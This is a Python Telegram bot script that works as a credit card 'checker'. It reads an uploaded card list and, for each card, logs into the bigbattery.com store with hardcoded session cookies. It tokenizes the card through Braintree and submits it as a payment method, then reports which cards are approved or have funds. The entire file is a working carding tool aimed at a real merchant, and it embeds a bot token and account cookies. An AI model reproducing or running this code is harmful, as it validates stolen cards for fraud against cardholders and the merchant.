import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
def  binn(bin,c,re):
	binn = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
	if 'Invalid BIN' in binn.text or 'not found.' in binn.text or 'Error code 521' in binn.text or 'cloudflare' in binn.text:
		binnn = 'None'
		brand = 'None'
		country = 'None'
		country_name = 'None'
		country_flag = 'None'
		country_currencies = 'None'
		bank = 'None'
		level = 'None'
		type = 'None'
	else:
		js = binn. json()
		binnn = js['bin']
		brand = js['brand']
		country = js['country']
		country_name = js['country_name']
		country_flag = js['country_flag']
		country_currencies = js['country_currencies'][0]
		bank = js['bank']
		level = js['level']
		type = js['type']
		return f"""*ア 𝘾𝘾 -» <code>{c}</code>
カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» <strong>Online</strong> ✅
零 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {re}
カ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» Braintree Auth
キ 𝘽𝙞𝙣 -» <code>{type} - {brand} - {level}</code>
朱 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>

ᥫ᭡ 𝙗𝙤𝙩 @M77SALAH"""
token = '7161511800:AAG8qP9cybURl6XdM8Kp2fylgQlsyBw7oF0'



bot = telebot.TeleBot(token)



@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id:
        idd = message.from_user.id
        first = message.from_user.first_name
        bot.reply_to(message,f"Hello Pro Bot\nPlease Send Cc List ✓",parse_mode="markdown")
        




@bot.message_handler(content_types=['document'])
def send_file(message):
	session = requests.Session()
	bad=0
	ccn=0
	cvv=0
	app=0
	nc=0
	els=0
	try:
		file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open(f"{message.document.file_name}", 'wb') as f:
			f.write(file_input)
	except:
		bot.reply_to(message, text='Error Cc List')
	key = types.InlineKeyboardMarkup(row_width=1)
	af = types.InlineKeyboardButton('OWNAR', url='https://t.me/ch4kscript')
	key.add(af)
	cou = len(open(f"{message.document.file_name}","r").read().splitlines())
	idmss=bot.reply_to(message, text=f'Done Read Files Count: {cou}',reply_markup=key)
	cookies = {
     '_ym_uid': '1712106192391042963',
    '_ym_d': '1712106192',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'b3f625251a30a7ac0ceb720237259af8',
    'PHPSESSID': '699mkpp6nd5pkjudrh6bao53fu',
    'wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580': 'bslinux.bs-1680%7C1715648579%7C4341orIC9KSQgwAA8EUWiT3mxSHSsviiWeOuktUtEkw%7Cb70b776ef224e4e9803b64fc79acc5754f5b89facbfcecb5edc567e0086da458',
    'wp_woocommerce_session_4ddd4c2f7ec54eccc91eb05ab852e580': '230588%7C%7C1715648349%7C%7C1715644749%7C%7Cf05e16647f0341c334fb5b90bf840494',
    '_uetsid': 'c8afdb300ffa11efa6d95fea81f3a9b9',
    '_uetvid': 'f1ea41c0f15511eebfcbcde28ac09f93',
    '__kla_id': 'eyJjaWQiOiJPRGRrTXpVek9XVXRNalJoWkMwME1EUXlMVGhqTm1ZdE0yRTFZVE0wWkdWbFpEQXoiLCIkZXhjaGFuZ2VfaWQiOiJDOUxmNkp0LXRlakJXS1JmaXF2SEJHVFhGc2wxWXhoY09DOXhlTUk3dlM4LlRLWFNOSyJ9',
}

	headers = {
		    'authority': 'bigbattery.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    # 'cookie': '_gcl_au=1.1.1547411099.1711080805; _ga=GA1.1.1360846250.1711080805; _ym_uid=1711080807679668437; _ym_d=1711080807; _fbp=fb.1.1711080808136.877764831; wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580=aqga347%7C1712290451%7CLhZl2IqbzuANHMjNnsd7zgVIdhedvqVa6OnfswY0DoR%7Caaddb4c81a1d9fe7a19c7c6d08b2d9e940f74be745b3feaa4667c867937261e7; _hjSessionUser_3651532=eyJpZCI6IjZmOGJhZjExLTYxOWQtNTIyZS1hZDY3LTAyY2JhNWMwYThjZSIsImNyZWF0ZWQiOjE3MTEwODA5MTg3OTIsImV4aXN0aW5nIjpmYWxzZX0=; wp_woocommerce_session_4ddd4c2f7ec54eccc91eb05ab852e580=224773%7C%7C1711559572%7C%7C1711555972%7C%7Cfbe9f26a7a7a2081908c52af4be8a5b5; _ym_isad=2; woocommerce_items_in_cart=1; woocommerce_cart_hash=7ebf02136a053ab1c3167188826a8809; __kla_id=eyJjaWQiOiJORFJrTjJVM05qRXRNVGhqTnkwME5XTmhMVGxqTjJRdE1EUm1NbUZqTlRnNU5ETTIiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTEzODY3NzksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vYmlnYmF0dGVyeS5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2QvIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzExMzk1NjQ5LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL2JpZ2JhdHRlcnkuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyJ9LCIkZXhjaGFuZ2VfaWQiOiJhNUo0dTBFdGRYSHNjb2FSbW1vRE9TTTI5Slp1X1FCbnVyVkxnV0xkeU00LlRLWFNOSyJ9; _uetsid=eda2e810eaca11eeb51e15684a5bbbfa; _uetvid=87a52a30e80211ee895b3318d37bb774; _ga_2KRDKZ6RTB=GS1.1.1711394983.4.1.1711395668.26.0.175789449; _rdt_uuid=1711080807807.0d80dbc4-a80c-4a7d-9c97-60436f3b0ddb',
		    'referer': 'https://bigbattery.com/my-account/payment-methods/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		}
		
	r= session.get('https://bigbattery.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',r.text)[0]
	aut=r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]
	for g in open(f"{message.document.file_name}","r").read().splitlines():
		nc+=1
		c = g.strip().split('\n')[0]
		cc = c.split('|')[0]
		exp=c.split('|')[1]
		ex=c.split('|')[2]
		try:
			exy=ex[2]+ex[3]
			if '2' in ex[3] or '1' in ex[3]:
				exy=ex[2]+'7'
			else:pass
		except:
			exy=ex[0]+ex[1]
			if '2' in ex[1] or '1' in ex[1]:
				exy=ex[0]+'7'
			else:pass
		cvc=c.split('|')[3]
		url = "https://payments.braintree-api.com/graphql"
	
		payload = json.dumps({
		  "clientSdkMetadata": {
		    "source": "client",
		    "integration": "custom",
		    "sessionId": "5f685625-f4b3-43db-ab05-f8a74dc449a0"
		  },
		  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
		  "variables": {
		    "input": {
		      "creditCard": {
		        "number": cc,
		        "expirationMonth": exp,
		        "expirationYear": "20"+exy,
		        "cvv": cvc,
		        "billingAddress": {
		          "postalCode": "10080",
		          "streetAddress": ""
		        }
		      },
		      "options": {
		        "validate": False
		      }
		    }
		  },
		  "operationName": "TokenizeCreditCard"
		})
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'sec-ch-ua-mobile': "?0",
		  'authorization': "Bearer "+auth,
		  'braintree-version': "2018-05-10",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'origin': "https://assets.braintreegateway.com",
		  'sec-fetch-site': "cross-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://assets.braintreegateway.com/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
		}
		
		response = session.post(url, data=payload, headers=headers)
		
		tokencc=(response.json()['data']['tokenizeCreditCard']['token'])
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': f'Bearer {auth}',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://bigbattery.com',
		    'referer': 'https://bigbattery.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		}
		
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': 'd96888a8-f1e7-48bc-8999-598e15584739',
		    },
		    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
		    'operationName': 'ClientConfiguration',
		}
		
		response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
		googleauth=(response.text.split('environment":"PRODUCTION","googleAuthorization":')[1].split('"')[1])
		braintreeClientId=(response.text.split('"braintreeClientId":')[1].split('"')[1])
		clientId=(response.text.split('"clientId":')[1].split('"')[1])
		merchants=(response.text.split('"merchantIdentifier":')[1].split('"')[1])
		
		
		url = "https://bigbattery.com/my-account/add-payment-method/"
		
		payload = 'payment_method=braintree_cc&braintree_cc_nonce_key='+tokencc+'&braintree_cc_device_data={"device_session_id":"1e9a92f73bfe0facfaa600458c8a9075","fraud_merchant_id":null,"correlation_id":"28824a76ae60054337303c7917c83832"}&braintree_cc_3ds_nonce_key=&braintree_cc_config_data={"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/'+merchants+'/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/'+merchants+'"},"merchantId":"'+merchants+'","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":'+merchants+'","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American+Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"BIGBATTERY,+INC.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"'+googleauth+'","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"BIGBATTERY,+INC.","clientId":"'+clientId+'","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"'+braintreeClientId+'","billingAgreementsEnabled":true,"merchantAccountId":"bigbatteryinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}&woocommerce-add-payment-method-nonce='+nonce+'&_wp_http_referer=/my-account/add-payment-method/&woocommerce_add_payment_method=1'
		
		headers = {
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		  'Content-Type': "application/x-www-form-urlencoded",
		  'cache-control': "max-age=0",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'sec-ch-ua-mobile': "?0",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'upgrade-insecure-requests': "1",
		  'origin': "https://bigbattery.com",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "navigate",
		  'sec-fetch-user': "?1",
		  'sec-fetch-dest': "document",
		  'referer': "https://bigbattery.com/my-account/add-payment-method/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
		   'cookie': '_ym_uid=1712106192391042963; _ym_d=1712106192; woocommerce_items_in_cart=1; woocommerce_cart_hash=b3f625251a30a7ac0ceb720237259af8; PHPSESSID=699mkpp6nd5pkjudrh6bao53fu; wordpress_logged_in_4ddd4c2f7ec54eccc91eb05ab852e580=bslinux.bs-1680%7C1715648579%7C4341orIC9KSQgwAA8EUWiT3mxSHSsviiWeOuktUtEkw%7Cb70b776ef224e4e9803b64fc79acc5754f5b89facbfcecb5edc567e0086da458; wp_woocommerce_session_4ddd4c2f7ec54eccc91eb05ab852e580=230588%7C%7C1715648349%7C%7C1715644749%7C%7Cf05e16647f0341c334fb5b90bf840494; _uetsid=c8afdb300ffa11efa6d95fea81f3a9b9; _uetvid=f1ea41c0f15511eebfcbcde28ac09f93; __kla_id=eyJjaWQiOiJPRGRrTXpVek9XVXRNalJoWkMwME1EUXlMVGhqTm1ZdE0yRTFZVE0wWkdWbFpEQXoiLCIkZXhjaGFuZ2VfaWQiOiJDOUxmNkp0LXRlakJXS1JmaXF2SEJHVFhGc2wxWXhoY09DOXhlTUk3dlM4LlRLWFNOSyJ9',
		}
		
		response = session.post(url, data=payload, headers=headers)
		soup = BeautifulSoup(response.text, 'html.parser')
		try:
			try:
				msg = soup.find('ul', class_='woocommerce-error').text.strip().split(":")[1]
				bad+=1
				color="\033[1;31m"
			except:
				msg = soup.find('ul', class_='woocommerce-error').text.strip()
		except:
			msg = response.text
			color="\033[1;31m"
		if 'Card Issuer Declined CVV' in msg:
			re="Declined CVV ❎"
			msg="Declined CVV ❎"
			color='\033[1;32m'
			ccn+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Insufficient Funds' in msg:
			re="Insufficient Funds. ✅"
			msg="Insufficient Funds. ✅"
			color='\033[1;32m'
			cvv+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg or "woocommerce-message" in msg:
			app+=1
			msg="Approved ✅"
			re="Approved. ✅"
			color='\033[1;32m'
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
			
		else:
			els+=1
			msg="else ✅"
			re="else ✅"
			color='\033[1;32m'
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
			
		
		
		key = types.InlineKeyboardMarkup(row_width=1)
		ccli = types.InlineKeyboardButton(f" {g} ☢", callback_data="cclist")
		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❎", callback_data="cvv")
		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❎", callback_data="cvv")
		ap = types.InlineKeyboardButton(f" approved : {app} ✅", callback_data="aproved")
		badd = types.InlineKeyboardButton(f" stauts : {msg} ❕", callback_data="baad")
		nch = types.InlineKeyboardButton(f" num chk : {nc} 💱", callback_data="chk")
		ap = types.InlineKeyboardButton(f" else new : {els} ✅", callback_data="else ")
		own = types.InlineKeyboardButton(f"OWNAR", url="https://t.me/ch4kscript")
		key.add(ccli,badd,nch,ap,ccnn, cvvv,own )
		bot.edit_message_text(chat_id=message.chat.id, message_id=idmss.message_id,text="Checker Run ✔", reply_markup=key)
		time.sleep(0)
		
bot.polling()